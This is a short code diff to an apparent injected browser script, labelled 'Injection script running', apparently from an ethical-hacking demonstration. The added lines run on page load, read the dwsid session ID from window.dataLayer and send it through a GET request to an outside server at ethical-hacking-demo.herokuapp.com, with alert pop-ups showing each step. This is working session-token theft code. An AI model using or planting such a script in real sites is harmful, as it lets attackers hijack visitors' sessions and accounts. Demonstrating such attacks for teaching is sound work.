@@ -1,22 +1,19 @@
-function getCookie(cname) {
-  let name = cname + "=";
-  let decodedCookie = decodeURIComponent(document.cookie);
-  let ca = decodedCookie.split(';');
-  for(let i = 0; i <ca.length; i++) {
-    let c = ca[i];
-    while (c.charAt(0) == ' ') {
-      c = c.substring(1);
-    }
-    if (c.indexOf(name) == 0) {
-      return c.substring(name.length, c.length);
-    }
-  }
-  return "";
-}
-
 document.addEventListener("DOMContentLoaded", function(event) {
     //do work
     alert('Injection script running');
-    let dwsid = getCookie("dwsid");
-    alert("Cookies dwsid:"  + dwsid);
+    let dwsid= '';
+    let dataLayer = window.dataLayer ? window.dataLayer : null;
+    if (dataLayer) {
+      for (let i = 0 ; i < dataLayer.length; i++) {
+        let dataEle = dataLayer[i];
+        if (dataEle && dataEle.sessionID) {
+          alert("Cookies dwsid:"  + dataEle.sessionID);
+          dwsid = dataEle.sessionID;
+          break;
+        }
+      }
+      $.get("https://ethical-hacking-demo.herokuapp.com/cookies?dwsid=" + dwsid, function(data,status) {
+        alert("Data: " + data + "\nStatus: " + status);
+      })
+    }
 });
